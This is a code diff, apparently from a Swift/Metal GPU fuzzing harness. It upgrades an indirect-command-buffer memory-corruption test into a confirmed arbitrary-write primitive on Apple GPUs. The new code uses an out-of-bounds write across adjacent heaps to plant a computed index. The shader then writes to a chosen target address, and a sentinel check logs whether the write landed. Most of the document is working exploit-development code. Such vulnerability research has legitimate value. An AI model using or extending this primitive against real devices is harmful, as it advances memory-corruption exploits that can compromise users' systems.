@@ -513,13 +513,11 @@ func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
-// ICB Corrupt — Indirect Command Buffer execution with OOB-corrupted bound buffer.
-// MTLHeap.makeIndirectCommandBuffer does not exist (device-only API), so ICB is
-// device-allocated. Attack: heap-allocate icbBuf from h1 (adjacent to h0 OOB src),
-// bind it into the ICB command, OOB-corrupt icbBuf[0] with a huge index value,
-// shader reads icbBuf[0] as a uint64 index and writes dataBuf[index & 511].
-// After corruption: index = 0xFFFFF00000000001 → GPU resolves via AGX PPT.
-// Execute via executeCommandsInBuffer → different kernel code path from direct dispatch.
+// ICB Controlled Write — full arbitrary GPU VA write primitive via ICB execute path.
+// OOB from h0 corrupts icbBuf[0] (in h1 adjacent heap) with a computed idx such that
+// dataBuf_base + idx*8 == targetBuf_base. GPU shader writes idx to that address.
+// CPU reads targetBuf[0] post-execute to confirm controlled write landed.
+// Both buffers are 256-aligned (Metal guarantee) so (target - data) is divisible by 8.
 func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         let sl = SyncLog()
@@ -527,7 +525,7 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
 
         guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
         guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); completion(); return }
-        step("── ICB Corrupt ────────────────────────────")
+        step("── ICB Controlled Write ──────────────────────")
 
         // h0 (OOB src) + h1 (victim — icbBuf lives here)
         let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
@@ -539,7 +537,7 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
         let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
         let va0 = UInt(bitPattern: p0)
 
-        // probe1 occupies h1[0..4095]; icbBuf will sit at h1[4096]
+        // probe1 at h1[0..4095]; icbBuf at h1[4096] — OOB-reachable from h0
         guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
         let va1 = UInt(bitPattern: probe1.contents())
         let dist = va1 > va0 ? va1 - va0 : va0 - va1
@@ -547,12 +545,31 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
         guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
         step("✓ adjacent confirmed")
 
-        // icbBuf bound into ICB — lives in h1 GPU-visible shared mem, OOB-reachable from h0
-        guard let icbBuf  = h1.makeBuffer(length: 64,   options: .storageModeShared) else { step("icbBuf nil");  completion(); return }
-        guard let dataBuf = device.makeBuffer(length: 4096, options: .storageModeShared) else { step("dataBuf nil"); completion(); return }
+        // icbBuf: ICB's bound index buffer — sits in h1, writable via h0 OOB
+        guard let icbBuf   = h1.makeBuffer(length: 64,   options: .storageModeShared) else { step("icbBuf nil");   completion(); return }
+        // dataBuf: shader's buffer(1) base address — GPU writes to dataBuf_base + idx*8
+        guard let dataBuf  = device.makeBuffer(length: 4096, options: .storageModeShared) else { step("dataBuf nil");  completion(); return }
+        // targetBuf: arbitrary write target — we compute idx so GPU lands here
+        guard let targetBuf = device.makeBuffer(length: 256, options: .storageModeShared) else { step("targetBuf nil"); completion(); return }
 
-        // Shader reads icbBuf[0] as UInt64 index, writes dataBuf[index & 511]
-        // After OOB corrupt: index = 0xFFFFF00000000001 (huge), GPU handles via AGX PPT
+        let dataBufBase   = UInt(bitPattern: dataBuf.contents())
+        let targetBufBase = UInt(bitPattern: targetBuf.contents())
+
+        // idx = (targetBuf_base - dataBuf_base) / 8  (mod 2^64, both 256-aligned → ÷8 exact)
+        // GPU: dataBuf_base + idx*8 = targetBuf_base  →  writes idx to targetBuf[0]
+        let idx = (targetBufBase &- dataBufBase) / 8
+
+        // Plant sentinel so we can detect if write landed at targetBuf[0]
+        let pTarget = targetBuf.contents().assumingMemoryBound(to: UInt64.self)
+        pTarget[0]  = 0xDEADBEEFCAFEBABE
+
+        step("dataBuf_base  = 0x\(String(dataBufBase,   radix:16))")
+        step("targetBuf_base= 0x\(String(targetBufBase, radix:16))")
+        step("idx            = 0x\(String(idx,           radix:16))")
+        step("targetBuf[0] sentinel = 0xDEADBEEFCAFEBABE")
+
+        // Shader: reads icbBuf[0] as idx, writes dataBuf[idx] = idx
+        // → with our idx: GPU writes idx (UInt64) to targetBuf_base
         let src = """
         #include <metal_stdlib>
         using namespace metal;
@@ -560,14 +577,13 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
                             device ulong* dataBuf  [[buffer(1)]],
                             uint id [[thread_position_in_grid]]) {
             ulong idx = indexBuf[0];
-            dataBuf[idx] = idx;  // raw OOB — no mask, GPU VA = dataBuf_base + idx*8
+            dataBuf[idx] = idx;
         }
         """
         let lib: MTLLibrary; let pso: MTLComputePipelineState
         do {
             lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
             guard let fn = lib.makeFunction(name: "icbFuzz") else { step("fn nil"); completion(); return }
-            // supportIndirectCommandBuffers required to use this PSO inside an ICB
             let psoDesc = MTLComputePipelineDescriptor()
             psoDesc.computeFunction = fn
             psoDesc.supportIndirectCommandBuffers = true
@@ -586,7 +602,7 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
                                                           options: .storageModeShared) else {
             step("✗ ICB nil"); completion(); return
         }
-        step("ICB allocated from device (storageModeShared)")
+        step("ICB allocated (storageModeShared)")
 
         // Encode 1 compute command into ICB
         let cmd0 = icb.indirectComputeCommandAt(0)
@@ -595,41 +611,52 @@ func runICBCorruptFuzz(log: FuzzLog, completion: @escaping () -> Void) {
         cmd0.setKernelBuffer(dataBuf, offset: 0, at: 1)
         cmd0.concurrentDispatchThreads(MTLSize(width:1,height:1,depth:1),
                                         threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
-        step("encoded ICB: icbFuzz(icbBuf[h1], dataBuf) dispatch(1,1,1)")
+        step("ICB encoded: icbFuzz(icbBuf[h1], dataBuf) dispatch(1,1,1)")
 
-        // OOB-corrupt icbBuf[0..7] via h0 (probe1 at h1[0..4095], icbBuf at h1[4096])
+        // OOB-corrupt icbBuf[0..7] via h0 with computed idx (little-endian, ARM64)
         // p0[actual + 4096 + b] writes into icbBuf[b]
-        let kptr: [UInt8] = [0x01,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]
-        step("OOB-corrupting icbBuf[0..7] = 0xFFFFFFF000000001 via h0 (raw GPU OOB — no mask)")
-        for b in 0..<8 { p0[actual + 4096 + b] = kptr[b] }
+        step("OOB-writing idx into icbBuf[0] via h0")
+        for b in 0..<8 { p0[actual + 4096 + b] = UInt8((idx >> (b * 8)) & 0xFF) }
 
+        // Readback to confirm OOB write landed
         var rb: UInt64 = 0
         for b in 0..<8 { rb |= UInt64(p0[actual + 4096 + b]) << (b*8) }
-        step("icbBuf[0] readback: 0x\(String(rb,radix:16))")
+        let rbMatch = rb == UInt64(idx)
+        step("icbBuf[0] readback: 0x\(String(rb,radix:16)) \(rbMatch ? "✓" : "✗ mismatch")")
 
         // Execute ICB via outer compute encoder
         guard let cmd = queue.makeCommandBuffer(),
               let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
         enc.setComputePipelineState(pso)
-        enc.useResource(icb,     usage: .read)
-        enc.useResource(icbBuf,  usage: .read)
-        enc.useResource(dataBuf, usage: .write)
+        enc.useResource(icb,       usage: .read)
+        enc.useResource(icbBuf,    usage: .read)
+        enc.useResource(dataBuf,   usage: .write)
+        enc.useResource(targetBuf, usage: .write)
         enc.executeCommandsInBuffer(icb, range: 0..<1)
         enc.endEncoding()
-        sl.write("CORRUPTED ICB EXECUTE — committing")
-        cmd.addCompletedHandler { cb in
+        sl.write("CONTROLLED WRITE — committing ICB execute")
+        cmd.addCompletedHandler { [pTarget, targetBuf] cb in
             let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
             switch s {
             case .completed:
-                step("  COMPLETED — GPU wrote at dataBuf_base + 0xFFFFFFF000000001*8")
-                step("  *** AGX PPT passed raw OOB — GPU wrote to arbitrary address ***")
+                let written = pTarget[0]
+                if written == UInt64(idx) {
+                    step("  *** CONTROLLED WRITE CONFIRMED ***")
+                    step("  targetBuf[0] = 0x\(String(written,radix:16)) == idx ✓")
+                    step("  GPU wrote to exact target VA via ICB execute — full arbitrary write primitive")
+                } else if written == 0xDEADBEEFCAFEBABE {
+                    step("  COMPLETED — sentinel intact, GPU write landed elsewhere")
+                    step("  targetBuf[0] = 0xDEADBEEFCAFEBABE (unchanged)")
+                } else {
+                    step("  COMPLETED — targetBuf[0]=0x\(String(written,radix:16)) (partial/unexpected)")
+                }
             case .error:
-                step("  ERROR — AGX PPT blocked OOB write (GPU page fault, handled cleanly)")
+                step("  ERROR — kernel blocked GPU write")
                 step("  error: \(e)")
             default:
                 step("  status=\(s.rawValue) err=\(e)")
             }
-            step("── ICB Corrupt complete ────────────────────")
+            step("── ICB Controlled Write complete ──────────")
             completion()
         }
         cmd.commit()
